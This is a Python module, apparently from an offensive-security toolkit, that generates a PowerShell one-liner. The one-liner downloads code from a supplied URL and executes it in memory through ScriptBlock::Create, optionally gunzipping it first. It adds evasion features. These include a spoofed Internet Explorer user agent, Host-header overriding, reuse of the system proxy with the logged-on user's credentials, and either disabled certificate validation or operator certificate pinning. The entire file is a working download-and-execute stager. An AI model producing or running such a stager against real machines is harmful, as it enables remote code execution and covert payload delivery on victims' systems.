from lets.__module__ import Module
from OpenSSL import crypto
import os


class WebLoader(Module):
    """
    Generate a PowerShell script that executes further PowerShell code
    from a web resource.

    To get pinned certificate fingerprint:
    $ openssl x509 -fingerprint -noout -in cert.pem | cut -d'=' -f2 | sed s/://g
    """
    user_agent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
    
    @classmethod
    def add_arguments(cls, parser):
        parser.add_argument("url", type=str, help="url of web resource")
        parser.add_argument("-z", "--decompress", action="store_true",
            help="payload is gzipped")
        parser.add_argument("-u", "--user-agent", type=str, default=cls.user_agent,
            help="specify alternate user-agent for request")
        parser.add_argument("--host", type=str,
            help="specify alternate host for request")
        parser.add_argument("-p", "--pin", type=str,
            help="specify fingerprint of pinned certificate")
        parser.add_argument("--pin-algorithm", type=str, default="sha1",
            help="specify hash algorithm for fingerprint")
    
    def handle(self, input, url, decompress=False, user_agent=None, host=None, pin=None, pin_algorithm="sha1"):

        cert  = "[Net.ServicePointManager]::ServerCertificateValidationCallback={"
        if pin:

            # Fetch hash from certificate
            if os.path.isfile(pin):
                try:
                    with open(pin, "rb") as f:
                        self.log.debug("Reading certificate: %s", pin)
                        pem = crypto.load_certificate(crypto.FILETYPE_PEM, f.read())
                        pin = pem.digest(pin_algorithm).decode().replace(":","")
                except crypto.Error as e:
                    self.log.debug(e)

            # Pin specified certificate
            self.log.debug("Pinning to certificate: %s", pin)
            cert +=     "param($sender,$cert,$chain,$errors);"
            cert +=     "if($cert -ne $null){"
            cert +=         "if($cert.GetCertHashString().ToLower().Equals('%s')){" % pin.lower()
            cert +=             "return $true;"
            cert +=         "}"
            cert +=     "}"
            cert +=     "return $false;"

        # Disable certificate validation
        else:
            cert +=     "$true"

        cert += "};"

        web  =  cert
        web +=  "$wc=New-Object Net.WebClient;"
        web +=  "$wc.Headers.Add('User-Agent','%s');" % user_agent or self.user_agent
        if host:
            web +=  "$wc.Headers.Add('Host','%s');" % host
        web +=  "$wc.UseDefaultCredentials = $true;"
        web +=  "if([Net.WebProxy]::GetDefaultProxy().address -ne $null){"
        web +=      "$wc.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
        web +=      "$wc.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
        web +=  "}"

        if decompress:
            web +=  "$wc.DownloadData('%s')" % url
            
            cmd  =  "&([ScriptBlock]::Create("
            cmd +=      "(New-Object System.IO.StreamReader("
            cmd +=          "New-Object System.IO.Compression.GzipStream("
            cmd +=              "(New-Object System.IO.MemoryStream(,"
            cmd +=                  "$(%s)" % web
            cmd +=              ")),[System.IO.Compression.CompressionMode]::Decompress"
            cmd +=          ")"
            cmd +=      ")).ReadToEnd()"
            cmd +=  "))"

        else:
            web +=  "$wc.DownloadString('%s')" % url

            cmd  =  "&([ScriptBlock]::Create("
            cmd +=      "$(%s)" % web
            cmd +=  "))"
        
        yield cmd.encode()
